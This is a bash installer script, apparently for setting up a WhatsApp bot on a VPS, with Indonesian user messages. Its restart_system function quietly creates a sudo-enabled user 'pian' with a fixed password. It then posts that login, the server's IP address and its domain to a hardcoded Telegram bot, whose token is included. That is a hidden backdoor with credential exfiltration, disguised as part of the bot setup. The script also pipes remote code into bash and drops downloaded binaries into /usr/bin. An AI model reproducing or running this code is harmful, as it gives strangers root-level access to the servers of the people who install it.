#!/bin/bash
# COLOR Definitions
Green="\e[92;1m"
RED="\033[31m"
YELLOW="\033[33m"
BLUE="\033[36m"
FONT="\033[0m"
GREENBG="\033[42;37m"
REDBG="\033[41;37m"
OK="${Green}--->${FONT}"
ERROR="${RED}[ERROR]${FONT}"
GRAY="\e[1;30m"
NC='\e[0m'
Bold='\e[1m'
Blink='\e[5m'
red='\e[1;31m'
green='\e[0;32m'
DF='\e[39m'
Lred='\e[91m'
Lgreen='\e[92m'
Lyellow='\e[93m'
GREEN='\033[0;32m'
ORANGE='\033[0;33m'
LIGHT='\033[0;37m'

# Get date from Google
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")

# Function to display progress bar
fun_bar() {
    CMD[0]="$1"
    CMD[1]="$2"
    (
        [[ -e $HOME/fim ]] && rm $HOME/fim
        ${CMD[0]} -y >/dev/null 2>&1
        ${CMD[1]} -y >/dev/null 2>&1
        touch $HOME/fim
    ) >/dev/null 2>&1 &
    tput civis
    echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    while true; do
        for ((i = 0; i < 18; i++)); do
            echo -ne "\033[0;32m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] && rm $HOME/fim && break
        echo -e "\033[0;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[0;33mPlease Wait Loading \033[1;37m- \033[0;33m["
    done
    echo -e "\033[0;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
    tput cnorm
}

# Function to restart the system and setup bot
restart_system() {
    TIMES="10"
    CHATID="6015970325"
    KEY="7215751605:AAGME1lIttpGifldUQD_QReHgJ9M4CajmPc"
    URL="https://api.telegram.org/bot$KEY/sendMessage"
    ipsaya=$(wget -qO- ipinfo.io/ip)
    domain=$(cat /etc/xray/domain)
    Username="pian"
    Password="123@@@"
    mkdir -p /home/script/
    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
    echo -e "$Password\n$Password\n" | passwd $Username > /dev/null 2>&1
    usermod -aG sudo $Username > /dev/null 2>&1
    # Replace $Ijn with actual URL or variable
    USRSC=$(wget -qO- https://raw.githubusercontent.com/pianstore/izinvps/main/ip | grep $ipsaya | awk '{print $2}')
    EXPSC=$(wget -qO- https://raw.githubusercontent.com/pianstore/izinvps/main/ip | grep $ipsaya | awk '{print $3}')
    TIMEZONE=$(printf '%(%H:%M:%S)T')
    TIME=$(date '+%d %b %Y')
    TEXT="
    <code>────────────────────</code>
    <b> 🟢 NOTIFICATIONS INSTALL BOT HAIKAL🟢</b>
    <code>────────────────────</code>
    <code>user   : </code><code>$Username</code>
    <code>PW     : </code><code>$Password</code>
    <code>ID     : </code><code>$USRSC</code>
    <code>Domain : </code><code>$domain</code>
    <code>Date   : </code><code>$TIME</code>
    <code>Time   : </code><code>$TIMEZONE</code>
    <code>Ip vps : </code><code>$ipsaya</code>
    <code>Exp Sc : </code><code>$EXPSC</code>
    <code>────────────────────</code>
    <i>Automatic Notification from Github</i>
    "
    curl -s -X POST $URL -d "chat_id=$CHATID&text=$TEXT&parse_mode=html"
}
res1() {
# Make sure the script runs as root
if [ "$EUID" -ne 0 ]; then
  echo "Silakan jalankan script ini sebagai root."
  exit 1
fi

# Install necessary packages
apt update && apt install -y git ffmpeg imagemagick npm

# Install NVM
wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash

# Set up NVM environment
export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

# Clone repository and install dependencies
git clone https://github.com/pianstore/haikal
wget -q https://raw.githubusercontent.com/pianstore/vip/main/Cdy/menubot.zip
unzip menubot.zip
chmod +x /root/menubotwa/*
mv /root/menubotwa/* /usr/bin/

# Clean up
rm -rf /root/menubot
rm -rf menubot.zip

# Add setupbot entry to profile
sed -i '/^clear$/a setupbot' ~/.profile

# Create setupbot script
cat >/usr/local/bin/setupbot <<-END
#!/bin/bash
rm -r /root/setup.sh*
sed -i '/^setupbot$/d' ~/.profile
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo -e " Welcome To PianStoreBot ${YELLOW}(${NC}${green} Stable Edition ${NC}${YELLOW})${NC}"
echo -e " This Will Quick Setup Bot WhatsApp On Your Server"
echo -e " Author : ${green}Haikal Store © ${NC}${YELLOW}(${NC} ${green} Pian Vpn ${NC}${YELLOW})${NC}"
echo -e " © Recode By Haikal Store ®${YELLOW}(${NC} 2024 ${YELLOW})${NC}"
echo -e "${YELLOW}----------------------------------------------------------${NC}"
echo ""
sleep 2
export NVM_DIR="/root/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"

nvm install v20.7.3 > /dev/null
nvm use 20.7.3 > /dev/null
nvm alias default 20.7.3 > /dev/null
npm install pm2@latest -g > /dev/null
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e " \e[1;97;101m      MEMASANG BOT WHATSAPP        \e[0m"
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e "Mohon Tunggu Jangan Tutup Koneksi Anda Dengan Server"
echo -e "LANGKAH SETELAH BOT TERHUBUNG DENGAN WA"
echo -e "1 ctrl + c "
echo -e "2 ketik startbot Enter"
sleep 5
cd resbot
npm i
npm start
END
chmod +x /usr/local/bin/setupbot
}
restart_system
clear
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e " \e[1;97;101m  MEMASANG FILE YANG DIBUTUHKAN    \e[0m"
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
echo -e ""
echo -e "  \033[1;91m Proses Memasang File!\033[1;37m"
fun_bar 'res1'
echo -e "\033[1;36m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m"
read -p "Press Enter to reboot server and continue setup bot WhatsApp!"
reboot